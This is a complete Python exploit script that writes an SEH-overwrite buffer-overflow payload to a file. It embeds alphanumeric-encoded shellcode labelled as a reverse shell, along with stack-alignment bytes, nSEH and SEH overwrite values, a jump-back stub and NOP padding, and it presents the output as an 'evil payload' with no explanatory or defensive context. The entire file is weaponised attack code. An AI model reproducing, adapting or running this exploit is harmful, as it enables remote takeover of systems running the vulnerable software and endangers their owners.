#!/usr/bin/python

import struct


revshell =  b""
revshell += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
revshell += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
revshell += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
revshell += b"\x42\x75\x4a\x49\x69\x6c\x48\x68\x6d\x52\x73\x30"
revshell += b"\x33\x30\x77\x70\x51\x70\x6f\x79\x7a\x45\x50\x31"
revshell += b"\x69\x50\x43\x54\x6c\x4b\x50\x50\x30\x30\x4c\x4b"
revshell += b"\x62\x72\x54\x4c\x4e\x6b\x52\x72\x66\x74\x4c\x4b"
revshell += b"\x72\x52\x67\x58\x46\x6f\x4c\x77\x30\x4a\x67\x56"
revshell += b"\x65\x61\x6b\x4f\x6e\x4c\x35\x6c\x43\x51\x71\x6c"
revshell += b"\x74\x42\x36\x4c\x45\x70\x79\x51\x7a\x6f\x56\x6d"
revshell += b"\x57\x71\x39\x57\x69\x72\x6c\x32\x76\x32\x31\x47"
revshell += b"\x4e\x6b\x62\x72\x54\x50\x6e\x6b\x33\x7a\x47\x4c"
revshell += b"\x4e\x6b\x52\x6c\x74\x51\x72\x58\x7a\x43\x62\x68"
revshell += b"\x77\x71\x7a\x71\x76\x31\x6c\x4b\x66\x39\x47\x50"
revshell += b"\x65\x51\x4b\x63\x4e\x6b\x32\x69\x42\x38\x6d\x33"
revshell += b"\x65\x6a\x32\x69\x6c\x4b\x36\x54\x6e\x6b\x73\x31"
revshell += b"\x59\x46\x75\x61\x59\x6f\x4c\x6c\x49\x51\x58\x4f"
revshell += b"\x44\x4d\x67\x71\x68\x47\x66\x58\x39\x70\x64\x35"
revshell += b"\x4a\x56\x36\x63\x61\x6d\x5a\x58\x77\x4b\x63\x4d"
revshell += b"\x66\x44\x42\x55\x69\x74\x33\x68\x4c\x4b\x76\x38"
revshell += b"\x47\x54\x55\x51\x4b\x63\x45\x36\x6c\x4b\x76\x6c"
revshell += b"\x50\x4b\x4e\x6b\x53\x68\x75\x4c\x63\x31\x49\x43"
revshell += b"\x6e\x6b\x33\x34\x4c\x4b\x75\x51\x48\x50\x4c\x49"
revshell += b"\x53\x74\x61\x34\x45\x74\x61\x4b\x53\x6b\x50\x61"
revshell += b"\x53\x69\x30\x5a\x63\x61\x39\x6f\x6d\x30\x51\x4f"
revshell += b"\x43\x6f\x52\x7a\x4c\x4b\x47\x62\x58\x6b\x6e\x6d"
revshell += b"\x73\x6d\x45\x38\x56\x53\x74\x72\x37\x70\x45\x50"
revshell += b"\x52\x48\x61\x67\x34\x33\x76\x52\x53\x6f\x72\x74"
revshell += b"\x61\x78\x30\x4c\x42\x57\x61\x36\x66\x67\x4b\x4f"
revshell += b"\x7a\x75\x4d\x68\x5a\x30\x66\x61\x45\x50\x77\x70"
revshell += b"\x71\x39\x59\x54\x76\x34\x70\x50\x51\x78\x64\x69"
revshell += b"\x4b\x30\x70\x6b\x63\x30\x4b\x4f\x6b\x65\x52\x70"
revshell += b"\x62\x70\x56\x30\x30\x50\x67\x30\x30\x50\x63\x70"
revshell += b"\x66\x30\x45\x38\x5a\x4a\x54\x4f\x59\x4f\x4d\x30"
revshell += b"\x6b\x4f\x38\x55\x4e\x77\x43\x5a\x75\x55\x75\x38"
revshell += b"\x59\x50\x4c\x68\x50\x64\x54\x35\x32\x48\x65\x52"
revshell += b"\x63\x30\x64\x51\x73\x6c\x4c\x49\x4a\x46\x52\x4a"
revshell += b"\x62\x30\x42\x76\x53\x67\x31\x78\x6e\x79\x4c\x65"
revshell += b"\x70\x74\x65\x31\x6b\x4f\x49\x45\x4d\x55\x79\x50"
revshell += b"\x71\x64\x44\x4c\x59\x6f\x70\x4e\x73\x38\x52\x55"
revshell += b"\x48\x6c\x62\x48\x4a\x50\x78\x35\x69\x32\x42\x76"
revshell += b"\x69\x6f\x6a\x75\x51\x78\x61\x73\x50\x6d\x43\x54"
revshell += b"\x47\x70\x6f\x79\x4d\x33\x30\x57\x62\x77\x53\x67"
revshell += b"\x30\x31\x7a\x56\x31\x7a\x54\x52\x72\x79\x53\x66"
revshell += b"\x6a\x42\x39\x6d\x71\x76\x78\x47\x50\x44\x44\x64"
revshell += b"\x67\x4c\x53\x31\x36\x61\x6c\x4d\x42\x64\x37\x54"
revshell += b"\x54\x50\x39\x56\x33\x30\x30\x44\x36\x34\x36\x30"
revshell += b"\x30\x56\x72\x76\x36\x36\x50\x46\x73\x66\x72\x6e"
revshell += b"\x73\x66\x52\x76\x32\x73\x62\x76\x31\x78\x43\x49"
revshell += b"\x48\x4c\x57\x4f\x4b\x36\x39\x6f\x4e\x35\x4c\x49"
revshell += b"\x39\x70\x70\x4e\x42\x76\x37\x36\x69\x6f\x74\x70"
revshell += b"\x62\x48\x56\x68\x4b\x37\x55\x4d\x75\x30\x49\x6f"
revshell += b"\x78\x55\x4f\x4b\x79\x70\x35\x4d\x64\x6a\x66\x6a"
revshell += b"\x72\x48\x4c\x66\x6f\x65\x4d\x6d\x4d\x4d\x4b\x4f"
revshell += b"\x49\x45\x67\x4c\x65\x56\x71\x6c\x74\x4a\x4f\x70"
revshell += b"\x79\x6b\x4d\x30\x53\x45\x75\x55\x4d\x6b\x72\x67"
revshell += b"\x76\x73\x30\x72\x52\x4f\x33\x5a\x43\x30\x46\x33"
revshell += b"\x39\x6f\x38\x55\x41\x41"


alignESP = "\x54\x58\x66\x05\xE0\x10\x50\x5C\xFF\xE4"

jumpBack = "\xE9\xC1\xF7\xFF\xFF"

nSEH = "\x74\x06\x75\x04"            # JZ - 74 and KNZ - 75
SEH  = struct.pack("<I", 0x0135ebee) # popad # jmp ebp |  {PAGE_READWRITE}

buffer  = "A" * 3
buffer += alignESP
buffer += "\x90" * 36
buffer += revshell
buffer += "\x90" * (2101 - len(buffer))
buffer += nSEH
buffer += SEH
buffer += jumpBack
buffer += "\x90" * (5000 - len(buffer))

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"

